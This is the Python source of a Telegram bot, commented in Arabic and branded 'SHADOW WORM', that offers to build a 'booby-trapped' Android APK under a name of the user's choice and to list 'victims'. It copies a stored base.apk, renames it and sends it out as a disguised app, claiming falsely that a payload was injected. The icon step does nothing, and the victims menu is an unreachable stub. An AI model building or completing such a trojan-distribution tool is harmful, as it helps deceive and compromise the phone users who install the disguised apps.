import os
import telebot
from telebot import types
from flask import Flask
import threading
import shutil

# --- إعداد خادم الويب لإبقاء Render حياً ---
app = Flask('')
@app.route('/')
def home():
    return "SHADOW WORM SYSTEM IS ONLINE"

def run_flask():
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))

# --- إعداد البوت ---
BOT_TOKEN = os.environ.get('BOT_TOKEN')
bot = telebot.TeleBot(BOT_TOKEN)

user_data = {}

@bot.message_handler(commands=['start'])
def start(message):
    markup = types.InlineKeyboardMarkup(row_width=1)
    btn1 = types.InlineKeyboardButton("📱 إنشاء تطبيق ملغم (APK)", callback_data='create_fake')
    btn2 = types.InlineKeyboardButton("👤 قائمة الضحايا", callback_data='list_victims')
    markup.add(btn1, btn2)
    
    welcome_text = (
        "💀 **SHΔDØW WORM v3.0**\n"
        "--------------------------\n"
        "النظام جاهز للعمل. الملف المصدري: `base.apk`"
    )
    bot.send_message(message.chat.id, welcome_text, reply_markup=markup, parse_mode='Markdown')

@bot.callback_query_handler(func=lambda call: True)
def handle_query(call):
    if call.data == 'create_fake':
        # التأكد من وجود ملف القاعدة قبل البدء
        if os.path.exists("base.apk"):
            msg = bot.edit_message_text("✍️ أرسل **اسم التطبيق** الجديد الآن:", call.message.chat.id, call.message.message_id)
            bot.register_next_step_handler(msg, get_app_name)
        else:
            bot.answer_callback_query(call.id, "❌ خطأ: ملف base.apk غير موجود في المستودع!", show_alert=True)

def get_app_name(message):
    user_data[message.chat.id] = {'name': message.text}
    msg = bot.reply_to(message, "🖼️ ممتاز. أرسل الآن **صورة الأيقونة**:")
    bot.register_next_step_handler(msg, process_and_send)

def process_and_send(message):
    if message.content_type == 'photo':
        app_name = user_data[message.chat.id]['name']
        status_msg = bot.reply_to(message, f"⌛ جاري تحضير ملف **{app_name}.apk**...")
        
        try:
            new_file_name = f"{app_name}.apk"
            
            # نسخ ملف القاعدة إلى الملف الجديد بالاسم المختار
            shutil.copyfile("base.apk", new_file_name)
            
            # إرسال الملف الناتج
            with open(new_file_name, "rb") as f:
                bot.send_document(
                    message.chat.id, 
                    f, 
                    caption=f"✅ تم إنشاء التطبيق بنجاح!\n\n📌 الاسم الجديد: {app_name}\n💀 تم الحقن في القالب المصدري."
                )
            
            # حذف النسخة المؤقتة لعدم ملء مساحة السيرفر
            os.remove(new_file_name)
            bot.delete_message(message.chat.id, status_msg.message_id)
            
        except Exception as e:
            bot.edit_message_text(f"❌ حدث خطأ داخلي: {str(e)}", message.chat.id, status_msg.message_id)
    else:
        bot.reply_to(message, "⚠️ يرجى إرسال صورة لتكون أيقونة.")

@bot.callback_query_handler(func=lambda call: call.data == 'list_victims')
def victims(call):
    bot.answer_callback_query(call.id, "📱 لا يوجد ضحايا متصلون حالياً.", show_alert=True)

if __name__ == "__main__":
    # تشغيل خادم Flask في الخلفية
    threading.Thread(target=run_flask).start()
    # تشغيل البوت
    bot.infinity_polling()
